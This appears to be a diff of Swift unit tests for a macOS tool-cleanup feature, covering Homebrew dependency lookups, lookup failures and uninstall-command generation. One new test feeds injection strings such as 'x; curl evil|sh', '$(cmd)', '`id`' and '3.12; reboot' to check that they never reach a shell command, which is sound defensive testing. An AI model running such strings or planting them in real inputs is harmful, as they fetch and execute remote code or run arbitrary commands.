@@ -1,12 +1,25 @@
 import XCTest
 @testable import MacUpdaterCore
 
-private struct ScriptedBrew: CleanupBrewQuerying {
-    var uses: [String: [String]] = [:]
-    var error: Error?
+private final class ScriptedBrew: CleanupBrewQuerying, @unchecked Sendable {
+    private let uses: [String: [String]]
+    private let error: Error?
+    private let failingFormulas: Set<String>
+    private let lock = NSLock()
+    private var recorded: [String] = []
+
+    init(uses: [String: [String]] = [:], error: Error? = nil, failingFormulas: Set<String> = []) {
+        self.uses = uses
+        self.error = error
+        self.failingFormulas = failingFormulas
+    }
+
+    var calls: [String] { lock.withLock { recorded } }
 
     func usesInstalled(formula: String) async throws -> [String] {
+        lock.withLock { recorded.append(formula) }
         if let error { throw error }
+        if failingFormulas.contains(formula) { throw BrewFailure() }
         return uses[formula] ?? []
     }
 }
@@ -176,7 +189,7 @@ final class CleanupDuplicateFindingsTests: XCTestCase {
             "lib/node_modules/@scope/pkg/bin/tool": (.packageManager(.npm), .command("npm uninstall -g @scope/pkg")),
             "lib/node_modules/plain/bin/tool": (.packageManager(.npm), .command("npm uninstall -g plain")),
             ".local/pipx/venvs/black/bin/tool": (.packageManager(.pipx), .command("pipx uninstall black")),
-            ".cargo/bin/tool": (.packageManager(.cargo), .command("cargo uninstall tool")),
+            ".cargo/bin/tool": (.packageManager(.cargo), .instruction(.removeWithCreatingTool)),
             ".bun/bin/tool": (.packageManager(.bun), .instruction(.removeWithCreatingTool)),
             ".fnm/node/bin/tool": (.versionManager(.fnm), .instruction(.removeWithCreatingTool)),
         ]
@@ -219,5 +232,60 @@ final class CleanupDuplicateFindingsTests: XCTestCase {
     func testNewerShadowedCopyNeedsDecision() async throws {
         let result = await builder().build(shadowed(source: .homebrewCask(token: "c"), version: "3.0.0", activeVersion: "2.0.0", real: tmp.url("opt/homebrew/Caskroom/c/3.0.0/c")))
         XCTAssertEqual(try shadowedFinding(result).bucket, .needsDecision)
+    }
+
+    func testUnsafePathComponentsNeverReachACommand() async throws {
+        let hostile = ["x; curl evil|sh", "$(cmd)", "a b", "line\nbreak", "-flag", "..", "`id`"]
+        for name in hostile {
+            let sources: [(CleanupSource, String)] = [
+                (.packageManager(.pipx), ".local/pipx/venvs/\(name)/bin/tool"),
+                (.packageManager(.npm), "lib/node_modules/\(name)/bin/tool"),
+                (.packageManager(.npm), "lib/node_modules/@scope/\(name)/bin/tool"),
+                (.versionManager(.uv), ".local/share/uv/tools/\(name)/bin/tool"),
+            ]
+            for (source, relative) in sources {
+                let finding = try shadowedFinding(await builder().build(shadowed(source: source, real: tmp.url(relative))))
+                XCTAssertEqual(finding.action, .instruction(.removeWithCreatingTool), "\(name) in \(relative)")
+            }
+        }
+        let finding = try shadowedFinding(await builder().build(shadowed(
+            source: .versionManager(.uv), version: "3.12; reboot",
+            real: tmp.url(".local/share/uv/python/cpython-3.12/bin/tool")
+        )))
+        XCTAssertEqual(finding.action, .instruction(.removeWithCreatingTool))
+    }
+
+    func testFailedLookupKeepsEarlierResultsAndDegradesOnlyUncheckedFormulas() async throws {
+        let first = try tmp.file("opt/homebrew/Cellar/aaa/1.0.0/bin/aaa", executable: true)
+        let second = try tmp.file("opt/homebrew/Cellar/bbb/1.0.0/bin/bbb", executable: true)
+        let active = copy(tmp.url(".local/bin/aaa"), source: .standalone, version: "9.0.0", role: .active, index: 0)
+        let activeB = copy(tmp.url(".local/bin/bbb"), source: .standalone, version: "9.0.0", role: .active, index: 0)
+        let one = copy(tmp.url("bin2/aaa"), real: first, source: .homebrewFormula(name: "aaa"), version: "1.0.0", role: .shadowed, index: 1)
+        let two = copy(tmp.url("bin2/bbb"), real: second, source: .homebrewFormula(name: "bbb"), version: "1.0.0", role: .shadowed, index: 1)
+        let input = CleanupPathScan(
+            groups: [CleanupToolGroup(name: "aaa", copies: [active, one]), CleanupToolGroup(name: "bbb", copies: [activeB, two])],
+            skippedProtected: [], missingDirectories: []
+        )
+        let result = await builder(ScriptedBrew(uses: ["aaa": ["dep"]], failingFormulas: ["bbb"])).build(input)
+
+        XCTAssertEqual(result.notes, [CleanupDetectorNote(detector: .homebrew, kind: .failed)])
+        let firstFinding = try XCTUnwrap(result.findings.first { $0.tool == "aaa" && $0.status != .active })
+        XCTAssertEqual(firstFinding.status, .dependency(["dep"]))
+        let secondFinding = try XCTUnwrap(result.findings.first { $0.tool == "bbb" && $0.status != .active })
+        XCTAssertEqual(secondFinding.status, .shadowed)
+        XCTAssertEqual(secondFinding.action, .none)
+        XCTAssertEqual(secondFinding.bucket, .needsDecision)
+    }
+
+    func testOneLookupPerDistinctFormulaAcrossGroups() async throws {
+        let real = try tmp.file("opt/homebrew/Cellar/gh/2.0.0/bin/gh", executable: true)
+        func group(_ name: String) -> CleanupToolGroup {
+            let active = copy(tmp.url(".local/bin/\(name)"), source: .standalone, version: "9.0.0", role: .active, index: 0)
+            let other = copy(tmp.url("bin2/\(name)"), real: real, source: .homebrewFormula(name: "gh"), version: "2.0.0", role: .shadowed, index: 1)
+            return CleanupToolGroup(name: name, copies: [active, other])
+        }
+        let brew = ScriptedBrew()
+        _ = await builder(brew).build(CleanupPathScan(groups: [group("one"), group("two")], skippedProtected: [], missingDirectories: []))
+        XCTAssertEqual(brew.calls, ["gh"])
     }
 }
